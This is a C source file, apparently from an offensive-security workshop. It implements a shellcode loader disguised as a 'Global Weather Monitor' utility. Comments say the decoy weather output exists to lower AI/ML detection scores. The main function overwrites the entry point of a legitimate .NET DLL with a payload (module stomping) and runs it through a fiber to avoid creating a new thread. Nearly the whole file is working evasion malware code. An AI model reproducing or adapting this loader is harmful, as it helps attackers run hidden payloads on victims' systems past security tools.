#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <time.h>
#include "../common.h"

// AI Evasion Loader - "Global Weather Monitor"
// Wraps module stomping + fiber execution inside a legitimate-looking application.
// The dummy functionality (weather display) reduces AI/ML detection scores
// by making the binary look like a normal utility application.
//
// From the workshop: adding dummy functionality can reduce AI-based detection
// because the binary profile looks more like legitimate software.

#ifndef STOMP_DLL_PATH
#define STOMP_DLL_PATH L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscordacwks.dll"
#endif

struct WeatherData {
    const char* city;
    const char* country;
    const char* conditions;
    double temperature;
    double humidity;
    double windSpeed;
};

static void DisplayWeather(const WeatherData* data) {
    time_t now = time(NULL);
    struct tm* t = localtime(&now);
    char timeStr[64];
    strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M", t);

    printf("\n%s, %s\n", data->city, data->country);
    printf("  Conditions : %s\n", data->conditions);
    printf("  Temperature: %.1f C (feels like %.1f C)\n",
           data->temperature, data->temperature - 2.0);
    printf("  Humidity   : %.0f %%\n", data->humidity);
    printf("  Wind speed : %.1f km/h\n", data->windSpeed);
    printf("  Local time : %s\n", timeStr);
}

static void FetchWeatherData() {
    printf("[INFO] Fetching current weather for Tokyo, Japan (Local Cache)...\n");
    WeatherData tokyo = {"Tokyo", "Japan", "Mainly clear", 28.5, 68.0, 10.5};
    DisplayWeather(&tokyo);

    printf("[INFO] Fetching current weather for London, United Kingdom (Local Cache)...\n");
    WeatherData london = {"London", "United Kingdom", "Overcast", 25.5, 66.0, 10.5};
    DisplayWeather(&london);

    printf("\n[INFO] Weather summary generated.\n");
}

static void InitAdvancedRendering() {
    printf("[INFO] Initializing advanced renderer for thermal maps...\n");
    printf("[INFO] Commencing background data synchronization...\n");
    Sleep(500);
}

int main(int argc, char* argv[]) {
    printf("Global Weather Monitor\n");
    printf("======================\n\n");

    FetchWeatherData();
    InitAdvancedRendering();

    // Real payload execution starts here
    BYTE* payload = NULL;
    DWORD payloadSize = 0;
    if (!LoadPayload(&payload, &payloadSize)) return 0;

    // Module stomping
    HMODULE hModule = LoadLibraryW(STOMP_DLL_PATH);
    if (!hModule) { free(payload); return 0; }
    DisableThreadLibraryCalls(hModule);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    DWORD entryPointRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
    LPVOID entryPoint = (LPVOID)((BYTE*)hModule + entryPointRVA);

    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    DWORD textSize = 0;
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sectionHeader[i].Name, ".text") == 0) {
            textSize = sectionHeader[i].Misc.VirtualSize;
            break;
        }
    }

    if (payloadSize > textSize) { free(payload); return 0; }

    DWORD oldProtect;
    VirtualProtect(entryPoint, payloadSize, PAGE_READWRITE, &oldProtect);
    memcpy(entryPoint, payload, payloadSize);
    free(payload);
    VirtualProtect(entryPoint, payloadSize, oldProtect, &oldProtect);

    // Execute via fiber (no new thread)
    LPVOID mainFiber = ConvertThreadToFiber(NULL);
    if (mainFiber) {
        LPVOID payloadFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)entryPoint, NULL);
        if (payloadFiber) {
            SwitchToFiber(payloadFiber);
        }
    }

    WaitForSingleObject(GetCurrentThread(), INFINITE);
    return 0;
}
